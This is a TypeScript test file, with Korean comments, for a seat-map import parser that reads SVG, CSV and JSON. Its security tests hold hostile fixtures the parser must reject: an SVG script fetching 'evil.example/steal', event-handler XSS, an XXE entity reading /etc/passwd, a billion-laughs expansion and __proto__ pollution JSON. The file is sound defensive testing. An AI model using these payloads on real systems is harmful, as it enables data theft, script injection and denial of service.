// 좌석맵 가져오기 해석기(seatmap-worker의 순수 함수, ADR-0257 결정 6·7, docs/features/seat-hold.md §10, BUILD_ORDER HOT-210).
// 해석기 공개 함수(parseSeatmapFile)만 부른다. 작업 스레드·gRPC·core-svc 다시 보기는 test-int/seatmap-import.int.test.ts가 본다.
import { describe, expect, test } from 'vitest';
import { parseSeatmapFile } from '../src/seatmap-worker/parse.js';

const enc = (s: string) => new TextEncoder().encode(s);
const svg = (body: string, attrs = 'viewBox="0 0 1000 800"') => `<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" ${attrs}>\n${body}\n</svg>`;
const parse = (text: string, format: 'SVG' | 'JSON' | 'CSV') => parseSeatmapFile(enc(text), format);
const HEADER = 'section,row,number,x,y,tier,wheelchair,gate,shape';

function parsed(r: ReturnType<typeof parseSeatmapFile>) {
  if (r.status !== 'PARSED') throw new Error(`해석하지 않았다: ${JSON.stringify(r.errors)}`);
  return r;
}

describe('SVG 읽기', () => {
  test('구역(polygon·rect·path)·무대·좌석(circle)을 읽어 정수 좌표의 배치로 만든다', () => {
    const r = parsed(
      parse(
        svg(`<g id="floor">
  <rect data-kind="stage" x="100" y="10" width="800" height="90"/>
  <polygon data-section="A구역" points="100,200 400,200 400,500 100,500"/>
  <rect id="B" x="500.4" y="200" width="300" height="300.6"/>
  <path data-section="C" d="M 100 600 L 300 600 l 0 100 H 100 Z"/>
  <circle cx="150.6" cy="250.4" r="8" data-section="A구역" data-row="1" data-number="12" data-tier="R" data-wheelchair="true" data-gate="동문"/>
  <circle cx="550" cy="250" data-section="B" data-row="가" data-number="3"/>
</g>`),
        'SVG',
      ),
    );
    expect(r.errors).toEqual([]);
    expect(r.ignored).toEqual([]);
    expect(r.layout).toEqual({
      canvas: { width: 1000, height: 800 },
      stage: [{ kind: 'RECT', points: [[100, 10], [900, 10], [900, 100], [100, 100]] }],
      sections: [
        { sectionId: '1', name: 'A구역', shape: { kind: 'POLYGON', points: [[100, 200], [400, 200], [400, 500], [100, 500]] }, seats: [{ row: '1', number: 12, x: 151, y: 250, tierId: 'R', wheelchair: true, gateZone: '동문' }] },
        { sectionId: '2', name: 'B', shape: { kind: 'RECT', points: [[500, 200], [800, 200], [800, 501], [500, 501]] }, seats: [{ row: '가', number: 3, x: 550, y: 250 }] },
        { sectionId: '3', name: 'C', shape: { kind: 'POLYGON', points: [[100, 600], [300, 600], [300, 700], [100, 700]] }, seats: [] },
      ],
    });
  });

  test('S-T32 ③ script·foreignObject·image·use·style·바깥 href는 따라가지 않고 이름만 무시 목록에 한 번씩 남는다 [ASVS v5.0.0-1.3.4] [ASVS v5.0.0-1.3.5]', () => {
    const r = parsed(
      parse(
        svg(
          `<style>polygon { fill: url(https://evil.example/x) }</style>
<script><![CDATA[ fetch('https://evil.example/steal') ]]></script>
<foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></foreignObject>
<image href="https://evil.example/a.png" x="0" y="0" width="10" height="10"/>
<use href="#A" xlink:href="https://evil.example/s.svg#x"/>
<polygon data-section="A" style="fill:red" onclick="alert(1)" points="0,0 10,0 10,10"/>
<circle data-section="A" data-row="1" data-number="1" cx="5" cy="5" onmouseover="x()" href="https://evil.example"/>
<polygon data-section="B" style="x" points="20,0 30,0 30,10"/>`,
          'xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100" onload="alert(1)"',
        ),
        'SVG',
      ),
    );
    expect(r.ignored).toEqual(['onload', 'style', 'script', 'foreignObject', 'image', 'use', 'onclick', 'onmouseover', 'href']);
    expect(r.layout.sections.map((s) => [s.name, s.shape.points.length, s.seats.length])).toEqual([
      ['A', 3, 1],
      ['B', 3, 0],
    ]);
    // 무시 목록에는 값과 바깥 주소가 없다
    expect(JSON.stringify(r.ignored)).not.toContain('evil.example');
    expect(r.errors).toEqual([]);
  });

  test('S-T32 ③ style 속성만 있어도, <style> 요소만 있어도 읽지 않고 무시 목록에 style로 남는다 [ASVS v5.0.0-1.3.5]', () => {
    const attrOnly = parsed(parse(svg('<polygon data-section="A" style="fill:url(https://evil.example/x)" points="0,0 10,0 10,10"/>'), 'SVG'));
    expect(attrOnly.ignored).toEqual(['style']);
    const elementOnly = parsed(parse(svg('<style>polygon { fill: url(https://evil.example/y) }</style><polygon data-section="A" points="0,0 10,0 10,10"/>'), 'SVG'));
    expect(elementOnly.ignored).toEqual(['style']);
    const onSeat = parsed(parse(svg('<polygon data-section="A" points="0,0 10,0 10,10"/><circle data-section="A" data-row="1" data-number="1" cx="1" cy="1" style="x"/>'), 'SVG'));
    expect(onSeat.ignored).toEqual(['style']);
    expect(JSON.stringify([attrOnly, elementOnly])).not.toContain('evil.example');
  });

  test('S-T32 ① 외부 엔터티를 부르는 SVG는 해석하지 않는다(DOCTYPE_PRESENT) [ASVS v5.0.0-1.5.1]', () => {
    const xxe = `<?xml version="1.0"?>\n<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<svg xmlns="http://www.w3.org/2000/svg"><polygon data-section="&xxe;" points="0,0 1,0 1,1"/></svg>`;
    expect(parse(xxe, 'SVG')).toEqual({ status: 'REJECTED', errors: [{ line: 0, field: 'svg', code: 'DOCTYPE_PRESENT' }], ignored: [] });
    // 소문자·주석 안에 숨겨도 같다
    expect(parse(svg('<!-- <!doctype x> -->'), 'SVG').status).toBe('REJECTED');
  });

  test('S-T32 ② DOCTYPE과 엔터티 확장으로 부풀린 SVG도 풀지 않고 거절한다 [ASVS v5.0.0-1.5.1]', () => {
    const lol = ['<?xml version="1.0"?>', '<!DOCTYPE lolz [', ' <!ENTITY lol "lol">', ...Array.from({ length: 9 }, (_, i) => ` <!ENTITY lol${i + 1} "${`&lol${i === 0 ? '' : i};`.repeat(10)}">`), ']>', '<svg><polygon data-section="&lol9;" points="0,0 1,0 1,1"/></svg>'].join('\n');
    const r = parse(lol, 'SVG');
    expect(r).toEqual({ status: 'REJECTED', errors: [{ line: 0, field: 'svg', code: 'DOCTYPE_PRESENT' }], ignored: [] });
  });

  test('S-T32 ② <!DOCTYPE 없이 <!ENTITY만 있어도 풀지 않고 DOCTYPE_PRESENT로 거절한다 [ASVS v5.0.0-1.5.1]', () => {
    const only = '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"><!ENTITY lol "lol"><polygon data-section="&lol;" points="0,0 1,0 1,1"/></svg>';
    expect(parse(only, 'SVG')).toEqual({ status: 'REJECTED', errors: [{ line: 0, field: 'svg', code: 'DOCTYPE_PRESENT' }], ignored: [] });
    // 소문자·주석 안에 숨겨도 같다
    expect(parse(svg('<!-- <!entity x "y"> --><polygon data-section="A" points="0,0 1,0 1,1"/>'), 'SVG')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'DOCTYPE_PRESENT' }] });
  });

  test('미리 정한 다섯 엔터티와 숫자 참조만 풀고 모르는 엔터티는 형식 불일치다 [ASVS v5.0.0-1.5.1]', () => {
    const r = parsed(parse(svg('<polygon data-section="&lt;A&amp;B&gt; &#xAC00;&#45208;" points="0,0 1,0 1,1"/>'), 'SVG'));
    expect(r.layout.sections[0]!.name).toBe('<A&B> 가나');
    expect(parse(svg('<polygon data-section="&nbsp;" points="0,0 1,0 1,1"/>'), 'SVG')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'FORMAT_MISMATCH' }] });
  });

  test('루트가 svg가 아니거나 짝이 맞지 않으면 형식 불일치다 [ASVS v5.0.0-5.2.2]', () => {
    for (const bad of ['<html><polygon/></html>', svg('<g>'), '<svg><polygon data-section="A" points="0,0 1,0 1,1"></svg>', `${svg('')}<svg/>`, 'not xml at all', '']) {
      expect(parse(bad, 'SVG'), bad).toMatchObject({ status: 'REJECTED', errors: [{ code: 'FORMAT_MISMATCH' }] });
    }
  });

  test('곡선이 든 path는 행 오류 PATH_UNSUPPORTED이고 transform은 무시 목록에 남는다', () => {
    const r = parsed(parse(svg('<path data-section="A" transform="scale(2)" d="M0 0 C 10 10 20 20 30 0 Z"/>\n<path data-section="B" d="M0,0 L10,0 L10,10 Z M20,20 L30,20 L30,30 Z"/>'), 'SVG'));
    expect(r.errors).toEqual([
      { line: 3, field: 'd', code: 'PATH_UNSUPPORTED' },
      { line: 4, field: 'd', code: 'PATH_UNSUPPORTED' },
      { line: 0, field: 'sections', code: 'NO_SECTIONS' },
    ]);
    expect(r.ignored).toEqual(['transform']);
  });

  test('S-T32 ⑤ 좌석 50,000석은 읽고 50,001석이면 끝까지 읽지 않고 해석하지 않는다', () => {
    const seats = (n: number) => Array.from({ length: n }, (_, i) => `<circle cx="${i % 1000}" cy="${Math.floor(i / 1000)}" data-section="A" data-row="${Math.floor(i / 1000)}" data-number="${i % 1000}"/>`).join('\n');
    const head = '<rect data-section="A" x="0" y="0" width="1000" height="100"/>\n';
    const ok = parsed(parse(svg(head + seats(50_000), 'viewBox="0 0 1000 100"'), 'SVG'));
    expect(ok.layout.sections[0]!.seats).toHaveLength(50_000);
    expect(parse(svg(head + seats(50_001), 'viewBox="0 0 1000 100"'), 'SVG')).toEqual({ status: 'REJECTED', errors: [{ line: 50_004, field: 'seat', code: 'TOO_MANY_SEATS' }], ignored: [] });
  });

  test('S-T32 ⑤ 구역 500개는 읽고 501개면, 꼭짓점 1,000개는 읽고 1,001개면 해석하지 않는다', () => {
    const areas = (n: number) => Array.from({ length: n }, (_, i) => `<rect data-section="S${i}" x="${i}" y="0" width="1" height="1"/>`).join('');
    expect(parsed(parse(svg(areas(500)), 'SVG')).layout.sections).toHaveLength(500);
    expect(parse(svg(areas(501)), 'SVG')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'TOO_MANY_SECTIONS' }] });
    const poly = (n: number) => `<polygon data-section="A" points="${Array.from({ length: n }, (_, i) => `${i},${i % 2}`).join(' ')}"/>`;
    expect(parsed(parse(svg(poly(1000)), 'SVG')).layout.sections[0]!.shape.points).toHaveLength(1000);
    expect(parse(svg(poly(1001)), 'SVG')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'TOO_MANY_POINTS' }] });
    const path = (n: number) => `<path data-section="A" d="M0 0 ${Array.from({ length: n - 1 }, (_, i) => `L${i + 1} ${i % 2}`).join(' ')} Z"/>`;
    expect(parsed(parse(svg(path(1000)), 'SVG')).layout.sections[0]!.shape.points).toHaveLength(1000);
    expect(parse(svg(path(1001)), 'SVG')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'TOO_MANY_POINTS' }] });
  });

  test('구역 이름 30자는 받고 31자는 행 오류, 열·번호 8자는 받고 9자는 행 오류다(제어 문자를 지운 뒤 센다)', () => {
    const name30 = '가'.repeat(30);
    const r = parsed(
      parse(
        svg(`<polygon data-section="${name30}\u202e" points="0,0 1,0 1,1"/>
<polygon data-section="${'나'.repeat(31)}" points="0,0 1,0 1,1"/>
<circle cx="0" cy="0" data-section="${name30}" data-row="ABCDEFGH" data-number="12345678"/>
<circle cx="0" cy="0" data-section="${name30}" data-row="ABCDEFGHI" data-number="1"/>
<circle cx="0" cy="0" data-section="${name30}" data-row="A" data-number="123456789"/>`),
        'SVG',
      ),
    );
    expect(r.errors).toEqual([
      { line: 4, field: 'section', code: 'NAME_TOO_LONG' },
      { line: 6, field: 'row', code: 'ROW_TOO_LONG' },
      { line: 7, field: 'number', code: 'NUMBER_INVALID' },
    ]);
    expect(r.layout.sections[0]!.name).toBe(name30);
    expect(r.layout.sections[0]!.seats).toEqual([{ row: 'ABCDEFGH', number: 12345678, x: 0, y: 0 }]);
  });
});

describe('CSV 읽기', () => {
  test('정한 머리와 따옴표 칸(RFC 4180)을 읽고 구역 첫 행의 shape로 도형을 만든다', () => {
    const csv = [HEADER, 'A,1,1,10,20,R,true,동문,"0 0;100 0;100 100;0 100"', 'A,1,2,20,20,R,,동문,', '"B ""2층""",가,1,150,50,S,false,,150 0;200 0;200 100', ''].join('\r\n');
    const r = parsed(parse(csv, 'CSV'));
    expect(r.errors).toEqual([]);
    expect(r.layout).toEqual({
      canvas: { width: 200, height: 100 },
      stage: [],
      sections: [
        { sectionId: '1', name: 'A', shape: { kind: 'POLYGON', points: [[0, 0], [100, 0], [100, 100], [0, 100]] }, seats: [{ row: '1', number: 1, x: 10, y: 20, tierId: 'R', wheelchair: true, gateZone: '동문' }, { row: '1', number: 2, x: 20, y: 20, tierId: 'R', gateZone: '동문' }] },
        { sectionId: '2', name: 'B "2층"', shape: { kind: 'POLYGON', points: [[150, 0], [200, 0], [200, 100]] }, seats: [{ row: '가', number: 1, x: 150, y: 50, tierId: 'S', wheelchair: false }] },
      ],
    });
  });

  test('S-T32 ⑧ 구역 이름의 제어 문자·양방향 제어 문자를 지운 이름으로 읽는다(NFC 한 번) [ASVS v5.0.0-1.1.1]', () => {
    // 한글 자모를 풀어 쓴 '가'(U+1100 U+1161)와 RLO·LRI·PDI·LRM·BEL·NUL·줄바꿈을 섞는다
    const dirty = '가\u202e나\u2066다\u2069\u200e\u0007\u0000\n라';
    const csv = [HEADER, `"${dirty}",1,1,1,1,,,,"0 0;5 0;5 5"`, `"가나다라",1,2,2,2,,,,`].join('\n');
    const r = parsed(parse(csv, 'CSV'));
    expect(r.layout.sections.map((s) => s.name)).toEqual(['가나다라']);
    expect(r.layout.sections[0]!.seats.map((s) => s.number)).toEqual([1, 2]);
    expect(r.errors).toEqual([]);
  });

  test('UTF-8은 한 번만 풀고(BOM 하나는 버린다) 잘못된 바이트는 형식 불일치다 [ASVS v5.0.0-1.1.1] [ASVS v5.0.0-5.2.2]', () => {
    const body = `${HEADER}\nA,1,1,1,1,,,,"0 0;5 0;5 5"\n`;
    const bom = new Uint8Array([0xef, 0xbb, 0xbf, ...enc(body)]);
    expect(parseSeatmapFile(bom, 'CSV').status).toBe('PARSED');
    // 퍼센트 인코딩·엔터티 모양은 풀지 않고 글자 그대로다(두 번 풀지 않는다)
    const twice = parsed(parse(`${HEADER}\n%EA%B0%80&amp;,1,1,1,1,,,,"0 0;5 0;5 5"\n`, 'CSV'));
    expect(twice.layout.sections[0]!.name).toBe('%EA%B0%80&amp;');
    expect(parseSeatmapFile(new Uint8Array([...enc(`${HEADER}\n`), 0xc3, 0x28]), 'CSV')).toEqual({ status: 'REJECTED', errors: [{ line: 0, field: 'file', code: 'FORMAT_MISMATCH' }], ignored: [] });
  });

  test('머리가 다르면 형식 불일치이고, 열 수·좌표·휠체어석 값·shape 빠짐은 그 줄의 행 오류다 [ASVS v5.0.0-5.2.2] [ASVS v5.0.0-2.2.1]', () => {
    expect(parse('section,row,number,x,y\nA,1,1,1,1', 'CSV')).toMatchObject({ status: 'REJECTED', errors: [{ line: 1, code: 'FORMAT_MISMATCH' }] });
    const csv = [HEADER, 'A,1,1,1,1,,,,"0 0;5 0;5 5"', 'A,1,2', 'A,1,3,x,1,,,,', 'A,1,4,1,1,,yes,,', 'B,1,1,1,1,,,,', 'A,1,5,1,1,,,,"1 1;2 2;3 3"', 'A,1,"6,1,1,,,,'].join('\n');
    const r = parse(csv, 'CSV');
    expect(r).toEqual({ status: 'REJECTED', errors: [{ line: 8, field: 'csv', code: 'FORMAT_MISMATCH' }], ignored: [] });
    const r2 = parsed(parse(csv.split('\n').slice(0, 7).join('\n'), 'CSV'));
    expect(r2.errors).toEqual([
      { line: 3, field: 'csv', code: 'COLUMN_COUNT' },
      { line: 4, field: 'x', code: 'COORD_INVALID' },
      { line: 5, field: 'wheelchair', code: 'WHEELCHAIR_INVALID' },
      { line: 6, field: 'shape', code: 'SHAPE_MISSING' },
      { line: 7, field: 'shape', code: 'SHAPE_REPEATED' },
      { line: 6, field: 'section', code: 'SECTION_UNKNOWN' },
    ]);
  });

  test('S-T32 ⑤ CSV 좌석 50,000줄은 읽고 50,001줄이면 해석하지 않는다', () => {
    const rows = (n: number) => [HEADER, ...Array.from({ length: n }, (_, i) => `A,${Math.floor(i / 1000)},${i % 1000},${i % 1000},${Math.floor(i / 1000)},,,,${i === 0 ? '"0 0;1000 0;1000 100"' : ''}`)].join('\n');
    expect(parsed(parse(rows(50_000), 'CSV')).layout.sections[0]!.seats).toHaveLength(50_000);
    expect(parse(rows(50_001), 'CSV')).toEqual({ status: 'REJECTED', errors: [{ line: 50_002, field: 'seat', code: 'TOO_MANY_SEATS' }], ignored: [] });
  });
});

describe('JSON 읽기', () => {
  const layout = (o: Record<string, unknown> = {}) => ({
    canvas: { width: 100, height: 100 },
    sections: [{ sectionId: 'A-1', name: 'A', shape: { kind: 'RECT', points: [[0, 0], [50, 0], [50, 50], [0, 50]] }, seats: [{ seatId: 'a-1', row: '1', number: 1, x: 10, y: 10, wheelchair: true }] }],
    ...o,
  });

  test('계약 SeatMapLayoutInput 모양이면 구역 ID·좌석 ID를 그대로 둔 배치다 [ASVS v5.0.0-1.5.2]', () => {
    const r = parsed(parse(JSON.stringify(layout()), 'JSON'));
    expect(r.layout).toEqual({ canvas: { width: 100, height: 100 }, stage: [], sections: [{ sectionId: 'A-1', name: 'A', shape: { kind: 'RECT', points: [[0, 0], [50, 0], [50, 50], [0, 50]] }, seats: [{ seatId: 'a-1', row: '1', number: 1, x: 10, y: 10, wheelchair: true }] }] });
  });

  test('S-T32 ⑥ format이 JSON인데 내용이 SVG면 형식 불일치로 해석하지 않는다 [ASVS v5.0.0-5.2.2]', () => {
    expect(parse(svg('<polygon data-section="A" points="0,0 1,0 1,1"/>'), 'JSON')).toEqual({ status: 'REJECTED', errors: [{ line: 0, field: 'json', code: 'FORMAT_MISMATCH' }], ignored: [] });
    // 반대로 SVG라 하고 JSON을 보내도, CSV라 하고 JSON을 보내도 같다
    expect(parse(JSON.stringify(layout()), 'SVG')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'FORMAT_MISMATCH' }] });
    expect(parse(JSON.stringify(layout()), 'CSV')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'FORMAT_MISMATCH' }] });
  });

  test('정의 밖 칸과 __proto__·constructor 키가 든 JSON은 받지 않는다 [ASVS v5.0.0-1.5.2]', () => {
    expect(parse(JSON.stringify(layout({ extra: 1 })), 'JSON')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'FORMAT_MISMATCH' }] });
    expect(parse('{"__proto__":{"polluted":true},"canvas":{"width":1,"height":1},"sections":[]}', 'JSON')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'FORMAT_MISMATCH' }] });
    expect(parse('{"canvas":{"width":1,"height":1,"constructor":{"prototype":{"x":1}}},"sections":[]}', 'JSON')).toMatchObject({ status: 'REJECTED' });
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  test('S-T32 ⑤ JSON의 좌석 50,001석·구역 501개·꼭짓점 1,001개는 해석하지 않고 50,000·500·1,000은 읽는다', () => {
    const seats = (n: number) => Array.from({ length: n }, (_, i) => ({ seatId: `s${i}`, row: String(Math.floor(i / 1000)), number: i % 1000, x: 1, y: 1 }));
    const sec = (seatList: unknown[], points = [[0, 0], [1, 0], [1, 1]]) => ({ sectionId: 'A', name: 'A', shape: { kind: 'POLYGON', points }, seats: seatList });
    const doc = (sections: unknown[]) => JSON.stringify({ canvas: { width: 10, height: 10 }, sections });
    expect(parsed(parse(doc([sec(seats(50_000))]), 'JSON')).layout.sections[0]!.seats).toHaveLength(50_000);
    expect(parse(doc([sec(seats(50_001))]), 'JSON')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'TOO_MANY_SEATS' }] });
    const many = (n: number) => Array.from({ length: n }, (_, i) => ({ ...sec([]), sectionId: `S${i}`, name: `S${i}` }));
    expect(parsed(parse(doc(many(500)), 'JSON')).layout.sections).toHaveLength(500);
    expect(parse(doc(many(501)), 'JSON')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'TOO_MANY_SECTIONS' }] });
    const pts = (n: number) => Array.from({ length: n }, (_, i) => [i, i % 2]);
    expect(parsed(parse(doc([sec([], pts(1000))]), 'JSON')).layout.sections[0]!.shape.points).toHaveLength(1000);
    expect(parse(doc([sec([], pts(1001))]), 'JSON')).toMatchObject({ status: 'REJECTED', errors: [{ code: 'TOO_MANY_POINTS' }] });
  });
});
